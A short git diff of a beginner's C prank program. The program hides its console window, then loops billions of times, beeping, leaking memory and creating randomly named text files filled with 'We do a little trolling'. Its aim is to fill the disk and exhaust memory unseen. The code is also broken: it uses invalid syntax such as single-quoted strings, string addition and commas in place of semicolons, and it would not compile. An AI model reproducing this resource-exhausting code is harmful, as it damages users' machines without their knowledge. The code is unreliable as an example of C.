@@ -6,13 +6,14 @@
 #endif
 
 //forgive me if this is trash I am new to C
-int main() {
+int main() 
+{
     #ifdef _WIN32
     HWND hWnd = GetConsoleWindow();
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     #endif
-    FILE[] *x;
+    FILE *x[];
     for(unsigned int i = 0; i < 4294967295; i++) {
         for(int y = 0; y < 10; y++) {
             print('\x7')
@@ -23,8 +24,10 @@ int main() {
         } else {
             malloc(i);
         }
-        x[i] = fopen(rand() + '.txt', 'w+')
-        for(int y = 0, y < i; y++){
+        char str[10];
+        x[i] = fopen(itoa(rand(), str, 10) + '.txt', 'w+')
+        for(int y = 0, y < i; y++)
+        {
             fputs("We do a little trolling\n", x[i]);
         }
     }
